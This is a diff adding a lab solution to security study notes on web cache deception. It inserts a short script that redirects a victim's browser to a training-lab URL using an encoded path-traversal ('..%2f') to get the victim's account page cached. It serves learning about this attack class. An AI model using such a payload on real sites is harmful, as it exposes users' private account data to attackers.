@@ -211,6 +211,13 @@ For example, consider the payload `/assets/..%2fprofile`:
 
 The origin server returns the dynamic profile information, which is stored in the cache.
 
+###### Lab: Exploiting origin server normalization for web cache deception
+```html
+<script>
+document.location="https://0a240078036bb4cf811abb09004400a7.web-security-academy.net/resources/..%2fmy-account";
+</script>
+```
+
 
 #### Exploiting normalization by the cache server
 
